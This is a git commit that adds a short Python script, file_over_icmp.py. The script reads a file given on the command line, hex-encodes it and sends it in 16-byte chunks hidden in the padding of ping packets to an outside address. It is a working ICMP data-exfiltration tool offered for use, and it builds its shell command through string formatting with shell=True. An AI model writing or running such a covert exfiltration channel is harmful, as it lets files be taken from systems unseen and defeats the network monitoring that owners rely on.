1b63a3e72ec81b589aec8005f7598b6d7e79451c
Corvo <rodrigo-f-p@hotmail.com>
2023-05-23 19:17:27 -0300

    Create file_over_icmp.py

---
+++ Code/Python/file_over_icmp.py
@@ -0,0 +1,25 @@
+import subprocess, sys
+
+def send_icmp_packet(data):
+    # Craft and send an ICMP packet using a system command
+    command = "ping -p {} 1.1.1.1".format(data)
+    subprocess.call(command, shell=True)
+
+def encode_file(filename):
+    # Read the file as binary data
+    with open(filename, "rb") as file:
+        file_data = file.read()
+
+    # Convert binary data to hexadecimal representation
+    hex_data = file_data.hex()
+
+    # Break the hexadecimal data into chunks (adjust the chunk size as needed)
+    chunk_size = 32  # Each chunk will be 32 characters (16 bytes)
+    chunks = [hex_data[i:i + chunk_size] for i in range(0, len(hex_data), chunk_size)]
+
+    # Send each chunk as an ICMP packet
+    for chunk in chunks:
+        send_icmp_packet(chunk)
+
+# Send file over ICMP:
+encode_file(sys.argv[1])
